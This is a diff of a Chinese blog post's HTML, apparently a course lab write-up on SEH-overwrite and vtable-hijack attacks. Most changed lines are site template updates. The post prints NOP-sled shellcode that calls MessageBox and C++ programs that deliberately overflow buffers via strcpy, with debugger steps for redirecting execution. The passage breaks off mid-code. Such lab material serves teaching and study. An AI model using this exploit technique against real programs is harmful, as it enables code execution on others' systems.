@@ -1,7 +1,7 @@
 <!DOCTYPE html><html lang="zh-CN"><head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
 <link rel="preconnect" href="https://fonts.geekzu.org" crossorigin="">
 <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -16,11 +16,11 @@
 
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.css" integrity="sha256-mdaMxrItEW6hMIVJJNPKuX0B7KCSJQVEv3mVY4N2we4=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer=""></script>
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.jason0743.space","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"onmobile":false},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"tomorrow-night"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":true,"height":500,"threshold":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.jason0743.space","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.29.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"onmobile":false},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"tomorrow-night"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":true,"height":500,"threshold":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script>
 
     <meta name="description" content="目标 了解 SEH 和虚函数攻击两种攻击方式，通过调试代码来理解进行上述攻击的过程。">
 <meta property="og:type" content="article">
@@ -54,7 +54,7 @@
 <meta property="og:image" content="https://blog.jason0743.space/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%838.png">
 <meta property="og:image" content="https://blog.jason0743.space/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%839.png">
 <meta property="article:published_time" content="2019-12-12T15:12:35.000Z">
-<meta property="article:modified_time" content="2026-05-12T02:33:58.840Z">
+<meta property="article:modified_time" content="2026-08-25T15:31:02.547Z">
 <meta property="article:author" content="Jason Ren">
 <meta property="article:tag" content="网络空间安全">
 <meta property="article:tag" content="软件安全">
@@ -86,10 +86,8 @@
 
 
   
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer=""></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer=""></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer=""></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer=""></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.umd.js" integrity="sha256-QnJV4HT5r8i89ovZGRD86iynZqHerEbT2xt69vDM36I=" crossorigin="anonymous" defer=""></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.1/pangu.umd.js" integrity="sha256-kRsxecBnwG6mULFPe2E6UKnNm8XfDOuDwCOprjLZuX8=" crossorigin="anonymous" defer=""></script>
 
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer=""></script>
@@ -114,7 +112,7 @@
 
   
 
-  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","display_overflow":"scroll","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-mml-chtml.js","integrity":"sha256-ihPtDDm7pTmSF9ViEsItlvsrBTsNkz0MOXMchzOwCQw="}}</script>
 
 
 
@@ -122,7 +120,119 @@
   <noscript>
     <link rel="stylesheet" href="/css/noscript.css">
   </noscript>
-<link rel="alternate" href="/atom.xml" title="随心记" type="application/atom+xml">
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style><link rel="alternate" href="/atom.xml" title="随心记" type="application/atom+xml">
 </head>
 
 <body itemscope="" itemtype="http://schema.org/WebPage" class="use-motion">
@@ -159,7 +269,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="https://www.jason0743.space/#/about" rel="section external nofollow noreferrer" target="_blank"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-note"><a href="https://note.jason0743.space/" rel="section external nofollow noreferrer" target="_blank"><i class="fa fa-book fa-fw"></i>笔记</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li><li class="menu-item menu-item-todo"><a href="/todo/" rel="section"><i class="fa fa-check fa-fw"></i>待办事项</a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><span class="exturl" data-url="aHR0cHM6Ly93d3cuamFzb24wNzQzLnNwYWNlLyMvYWJvdXQ="><i class="fa fa-user fa-fw"></i>关于</span></li><li class="menu-item menu-item-note"><span class="exturl" data-url="aHR0cHM6Ly9ub3RlLmphc29uMDc0My5zcGFjZQ=="><i class="fa fa-book fa-fw"></i>笔记</span></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li><li class="menu-item menu-item-todo"><a href="/todo/" rel="section"><i class="fa fa-check fa-fw"></i>待办事项</a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -240,16 +350,16 @@
 </div>
   <div class="links-of-author animated">
       <span class="links-of-author-item">
-        <a href="https://github.com/jasonren0403" title="GitHub → https://github.com/jasonren0403" rel="noopener me external nofollow noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phc29ucmVuMDQwMw==" title="GitHub → https://github.com/jasonren0403"><i class="fab fa-github fa-fw"></i>GitHub</span>
       </span>
       <span class="links-of-author-item">
-        <a href="https://x.com/theRealRev270" title="X(前 Twitter) → https://x.com/theRealRev270" rel="noopener me external nofollow noreferrer" target="_blank"><i class="fab fa-x fa-fw"></i>X(前 Twitter)</a>
+        <span class="exturl" data-url="aHR0cHM6Ly94LmNvbS90aGVSZWFsUmV2Mjcw" title="X(前 Twitter) → https://x.com/theRealRev270"><i class="fab fa-x fa-fw"></i>X(前 Twitter)</span>
       </span>
       <span class="links-of-author-item">
-        <a href="https://www.facebook.com/renjason1999/" title="Facebook → https://www.facebook.com/renjason1999/" rel="noopener me external nofollow noreferrer" target="_blank"><i class="fab fa-facebook fa-fw"></i>Facebook</a>
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Jlbmphc29uMTk5OS8=" title="Facebook → https://www.facebook.com/renjason1999/"><i class="fab fa-facebook fa-fw"></i>Facebook</span>
       </span>
       <span class="links-of-author-item">
-        <a href="https://www.instagram.com/jasonren0403/" title="Instagram → https://www.instagram.com/jasonren0403/" rel="noopener me external nofollow noreferrer" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9qYXNvbnJlbjA0MDMv" title="Instagram → https://www.instagram.com/jasonren0403/"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
       </span>
   </div>
 
@@ -269,28 +379,11 @@
         </div>
         <ul class="links-of-blogroll-list">
             <li class="links-of-blogroll-item">
-              <a href="https://hanyujie2002.fly.dev/" title="https://hanyujie2002.fly.dev/" rel="noopener external nofollow noreferrer" target="_blank">Yujie Han’s blog</a>
+              <span class="exturl" data-url="aHR0cHM6Ly9oYW55dWppZTIwMDIuZmx5LmRldi8=" title="https://hanyujie2002.fly.dev/">Yujie Han’s blog</span>
             </li>
         </ul>
       </div>
     </div>
-        <div class="sidebar-inner sidebar-post-related">
-          <div class="animated">
-              <div class="links-of-blogroll-title"><i class="fa fa-signs-post fa-fw"></i>
-    相关文章
-  </div>
-  <ul class="popular-posts">
-    <li class="popular-posts-item">
-      <a class="popular-posts-link" href="/2019/11/13/experiments/security/software/shellcode/" rel="bookmark">
-        <time class="popular-posts-time">2019-11-13</time>
-        <br>
-      Shellcode 利用
-      </a>
-    </li>
-  </ul>
-
-          </div>
-        </div>
   </aside>
 
 
@@ -343,7 +436,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-05-12 10:33:58" itemprop="dateModified" datetime="2026-05-12T10:33:58+08:00">2026-05-12</time>
+      <time title="修改时间：2026-08-25 23:31:02" itemprop="dateModified" datetime="2026-08-25T23:31:02+08:00">2026-08-25</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -426,63 +519,63 @@
 <div class="note info"><p>前面的<code>__asm int 3</code>是为了使得调试器能够以 attach 的方式进行调试。</p>
 </div>
 <ol>
-<li>在 ollydbg 端完成实时调试配置，将它设置为实时调试器。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/1.png" class=""></li>
+<li>在 ollydbg 端完成实时调试配置，将它设置为实时调试器。 <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/1.png" class=""></li>
 <li>启动程序，在运行到 int 3 断点时成功进入 ollydbg 中。<div class="note warning"><p>初次进入时可能会有这个错误，设置一下 udd 和 plugins 的目录即可。<br>
-<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/2.png" class=""> <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/3.png" class=""></p>
+<img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/2.png" class=""> <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/3.png" class=""></p>
 </div>
 </li>
-<li>找到<code>strcpy</code>函数，并为其设置一个断点。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/4.png" class="" title="可以看到这是在401158处"> <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/5.png" class=""></li>
-<li>此时可以观察到 shellcode 的起始地址为<code>0x12fe48</code>。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/6.png" class=""></li>
-<li>触发异常时，我们查看 SEH 链：（查看→SEH 链）<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/7.png" class=""></div><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/8.png" class=""></div></div></div>
+<li>找到<code>strcpy</code>函数，并为其设置一个断点。 <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/4.png" class="" title="可以看到这是在401158处"> <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/5.png" class=""></li>
+<li>此时可以观察到 shellcode 的起始地址为<code>0x12fe48</code>。 <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/6.png" class=""></li>
+<li>触发异常时，我们查看 SEH 链：（查看→SEH 链）<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/7.png" class=""></div><div class="group-picture-column"><img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/8.png" class=""></div></div></div>
 </li>
 <li>上方的第一个地址指向了下一个 SEH 记录：<code>0x12ffb0</code>。接着是 SEH 异常处理程序，我们只要把<code>0x12ff1c</code>的内容改成 shellcode 的起始地址就可以了。</li>
 <li>第一个 SEH 地址是<code>0x12ff18</code>，异常处理地址是<code>0x12ff1c</code>，我们的 shellcode 应该填充这些差值空间，总共有 212 个字节（0x12ff1c-0x12ff18）<div class="note success no-icon"><p>回头看一眼我们要填入的 shellcode，最后四字节 (<code>\x48\xFE\x12\x00</code>) 恰好是 shellcode 的起始地址！</p>
 </div>
 </li>
-<li>去掉系统中断（<code>asm int 3</code>）后的运行效果如下，弹出对话框正是 shellcode 预期的功能。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/9.png" class=""></li>
+<li>去掉系统中断（<code>asm int 3</code>）后的运行效果如下，弹出对话框正是 shellcode 预期的功能。 <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/9.png" class=""></li>
 </ol>
 <h3 id="虚函数攻击">虚函数攻击</h3>
 <figure class="highlight c++"><figcaption><span>main.cpp</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode1[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"</span></span><br><span class="line"><span class="string">"\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x5C\xE3\x42\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vf</span> {</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">		cout&lt;&lt;<span class="string">"Class Vtable::test()"</span>&lt;&lt;endl;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">;</span><br><span class="line">vf overflow, *p;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">"user32.dll"</span>);</span><br><span class="line">	<span class="type">char</span> * p_vtable;</span><br><span class="line">	p_vtable=overflow.buf<span class="number">-4</span>;</span><br><span class="line">	<span class="comment">//point to virtual table //__asm int 3 //reset</span></span><br><span class="line">	fake <span class="keyword">virtual</span> table to <span class="number">0x004088cc</span> <span class="comment">//the address may need to adjusted via runtime debug p_vtable[0]=0x30; p_vtable[1]</span></span><br><span class="line">	=<span class="number">0xE4</span>;</span><br><span class="line">	p_vtable[<span class="number">2</span>]=<span class="number">0x42</span>;</span><br><span class="line">	p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line">	<span class="built_in">strcpy</span>(overflow.buf,shellcode1);</span><br><span class="line">	<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">	p=&amp;overflow;</span><br><span class="line">	p-&gt;<span class="built_in">test</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 <ol>
 <li>
 <p>在<code>strcpy</code>处可能会触发溢出，修改虚函数指针。<code>Vtable</code>的值需要经过一次调试才可得知。</p>
-<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/10.png" class=""> 
-<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/11.png" class="">
+<img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/10.png" class=""> 
+<img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/11.png" class="">
 <p>从这两张图可以看出，缓冲区的入口为<code>0x0042e35c</code>。虚表指针位于缓冲区前，<code>p_vtable</code>定位到了这个指针，它指向了<code>0x0042e358</code>处，进一步证明缓冲区入口正确。</p>
 </li>
 <li>
-<p>Shellcode 的末尾后四个字节地址应该是<code>0x0042E430</code>。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/12.png" class=""></p>
+<p>Shellcode 的末尾后四个字节地址应该是<code>0x0042E430</code>。 <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/12.png" class=""></p>
 </li>
 <li>
-<p>更换 shellcode 和地址后，成功弹框，shellcode 成功执行。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/13.png" class=""></p>
+<p>更换 shellcode 和地址后，成功弹框，shellcode 成功执行。 <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/13.png" class=""></p>
 </li>
 </ol>
 <h2 id="测试结论">测试结论</h2>
-<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/SEH.jpg" class="" title="SEH异常处理攻击图示"></div><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/vf.jpg" class="" title="虚函数攻击图示"></div></div></div>
+<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/SEH.jpg" class="" title="SEH异常处理攻击图示"></div><div class="group-picture-column"><img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/vf.jpg" class="" title="虚函数攻击图示"></div></div></div>
 <h2 id="思考题">思考题</h2>
-<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vf</span> {</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">		cout&lt;&lt;<span class="string">"Class Vtable::test()"</span>&lt;&lt;endl;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vf1</span> {</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">		cout&lt;&lt;<span class="string">"Class Vtable1::test()"</span>&lt;&lt;endl;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">;</span><br><span class="line">vf overflow, *p;</span><br><span class="line">vf1 overflow1, *p1;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>{</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">"user32.dll"</span>);</span><br><span class="line">	<span class="comment">//char * p_vtable;</span></span><br><span class="line">	<span class="comment">//p_vtable=overflow.buf-4;</span></span><br><span class="line">	<span class="comment">//point to virtual table</span></span><br><span class="line">	<span class="comment">//__asm int 3 </span></span><br><span class="line">	<span class="comment">//reset fake virtual table to 0x004088cc </span></span><br><span class="line">	<span class="comment">//the address may need to adjusted via runtime debug</span></span><br><span class="line">	<span class="comment">//p_vtable[0]=0x30; </span></span><br><span class="line">	<span class="comment">//p_vtable[1]=0xE4; </span></span><br><span class="line">	<span class="comment">//p_vtable[2]=0x42; </span></span><br><span class="line">	<span class="comment">//p_vtable[3]=0x00;</span></span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>) {</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow.buf,argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow1.buf,argv[<span class="number">2</span>]);</span><br><span class="line">		<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">		p=&amp;overflow;</span><br><span class="line">		p-&gt;<span 